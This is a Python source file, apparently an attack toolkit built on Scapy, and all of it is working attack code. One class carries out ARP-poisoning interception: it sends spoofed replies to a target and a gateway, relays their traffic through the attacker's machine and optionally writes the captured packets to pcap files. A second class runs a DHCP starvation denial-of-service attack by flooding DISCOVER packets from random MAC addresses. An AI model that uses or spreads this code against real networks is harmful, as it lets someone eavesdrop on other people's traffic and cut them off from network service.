import threading
import time
import random
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.utils import mac2str


class ArpPoisoning:
    def __init__(self, target, gateway, iface, do_save):
        self.target = target
        self.gateway = gateway
        self.attacker_mac = get_if_hwaddr(iface)
        self.iface = iface
        self.is_running = False
        self.__thread = None
        self.__sniff_thread = None
        self.do_save = do_save
        self.pcap_writer = None
        
        if self.do_save:
            try:
                import os
                captures_dir = "captures"
                if not os.path.exists(captures_dir):
                    os.makedirs(captures_dir)
                    
                #set filename based on target and gateway IPs and timestamp
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                self.pcap_filename = os.path.join(captures_dir, f"arp_poison_{self.target.ip_address}_{self.gateway.ip_address}_{timestamp}.pcap")
                self.pcap_writer = PcapWriter(self.pcap_filename, append=True, sync=True)
            except Exception as e:
                print(f"Error initializing packet capture: {e}")
                self.do_save = False


    def poison_tabels(self):
        """
        Sends spoofed ARP replies to both the target and the gatway,
        putting the attacker's machine in the middle of their communication
        :return:
        """
        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.attacker_mac
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.attacker_mac
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def forward_packet(self, pkt):
        """
        forwards packets between the target and the gateway, modifying the
        ethernet headers to ensure they are sent to the correct destination
        :param pkt:
        :return:
        """

        if not pkt.haslayer(IP):
            return

        # traffic from target to gatewat
        if pkt[Ether].src == self.target.mac_address:
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.gateway.mac_address
            #save packet to pcap if enabled
            if self.do_save and self.pcap_writer:
                try:
                    self.pcap_writer.write(pkt)
                except Exception as e:
                    pass # Silently fail to avoid console spam during high-volume forwarding
            sendp(pkt, verbose=False, iface=self.iface)

        # traffic from gateway to target
        elif pkt[Ether].src == self.gateway.mac_address and pkt[IP].dst == self.target.ip_address:
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.target.mac_address
            if self.do_save and self.pcap_writer:
                try:
                    self.pcap_writer.write(pkt)
                except Exception as e:
                    pass
            sendp(pkt, verbose=False, iface=self.iface)

    def restore_tables(self):
        """
        Sends correct ARP replies to both the target and the gateway,
        :return:
        """
        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.target.mac_address
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.gateway.mac_address
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def start_sniffing(self):
        """
        sniffs traffic to forward it
        :return:
        """
        sniff(iface=self.iface, prn=self.forward_packet, stop_filter=lambda x: not self.is_running)

    def poison(self):
        try:
            while self.is_running:
                self.poison_tabels()
                time.sleep(2)
        except KeyboardInterrupt:
            print("Restoring ARP tables...")
            self.is_running = False
            self.restore_tables()


    def start(self):
        self.is_running = True

        # poisoning thread
        self.__thread = threading.Thread(target=self.poison)
        self.__thread.start()

        # forwarding thread
        self.__sniff_thread = threading.Thread(target=self.start_sniffing)
        self.__sniff_thread.start()

        print("Starting ARP poisoning and forwarding...")

    def stop(self):
        self.is_running = False

        # stop threads and restore tables
        if self.__thread is not None:
            self.__thread.join()

        if self.__sniff_thread is not None:
            self.__sniff_thread.join()

        self.restore_tables()

        if self.do_save and self.pcap_writer:
            try:
                self.pcap_writer.close()
            except Exception as e:
                print(f"Error closing packet capture: {e}")
        print("ARP poisoning stopped, ARP tables restored.")


class DoS:
    def __init__(self, *, iface):
        self.__thread = None
        self.iface = iface
        self.is_running = False

    def Dos_attack(self):
        # packet template with static fields
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src="0.0.0.0", dst="255.255.255.255") \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=1) \
                        / DHCP(options=[("message-type", "discover"), "end"])
        
        while self.is_running:
            # update randomized fields
            random_mac = str(RandMAC())
            dhcp_discover[Ether].src = random_mac
            dhcp_discover[BOOTP].chaddr = mac2str(random_mac)
            dhcp_discover[BOOTP].xid = random.randint(0, 0xFFFFFFFF)

            sendp(dhcp_discover, iface=self.iface, verbose=False)

    def start(self):
        self.is_running = True
        conf.checkIPaddr = False
        self.__thread = threading.Thread(target=self.Dos_attack)
        self.__thread.start()

    def stop(self):
        self.is_running = False
        conf.checkIPaddr = True
        if self.__thread is not None:
            self.__thread.join()
